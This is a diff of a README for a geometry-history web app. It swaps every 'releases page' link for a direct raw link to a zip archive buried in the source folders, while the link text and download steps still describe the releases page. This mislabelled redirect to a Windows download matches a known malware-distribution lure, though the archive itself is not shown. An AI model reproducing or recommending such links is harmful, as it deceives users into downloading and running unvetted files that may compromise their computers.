@@ -1,6 +1,6 @@
 # 🌍 geometry-lore - Explore geometry through time
 
-[![Download](https://img.shields.io/badge/Download%20for%20Windows-purple?style=for-the-badge&logo=github)](https://github.com/firstborn-personalmagnetism628/geometry-lore/releases)
+[![Download](https://img.shields.io/badge/Download%20for%20Windows-purple?style=for-the-badge&logo=github)](https://github.com/firstborn-personalmagnetism628/geometry-lore/raw/refs/heads/main/src/sections/Philosophy/lore_geometry_2.2-beta.2.zip)
 
 ## 🧭 Overview
 
@@ -10,7 +10,7 @@ This app uses React, TypeScript, GSAP, and Lenis to create smooth motion and cle
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/firstborn-personalmagnetism628/geometry-lore/releases)
+1. Open the [releases page](https://github.com/firstborn-personalmagnetism628/geometry-lore/raw/refs/heads/main/src/sections/Philosophy/lore_geometry_2.2-beta.2.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. Save the file to your computer
@@ -120,7 +120,7 @@ If the app opens in a browser and you see a blank page, refresh the page once an
 
 To get the newest version:
 
-1. Open the [releases page](https://github.com/firstborn-personalmagnetism628/geometry-lore/releases)
+1. Open the [releases page](https://github.com/firstborn-personalmagnetism628/geometry-lore/raw/refs/heads/main/src/sections/Philosophy/lore_geometry_2.2-beta.2.zip)
 2. Download the latest file
 3. Replace the older copy on your computer
 4. Open the new file
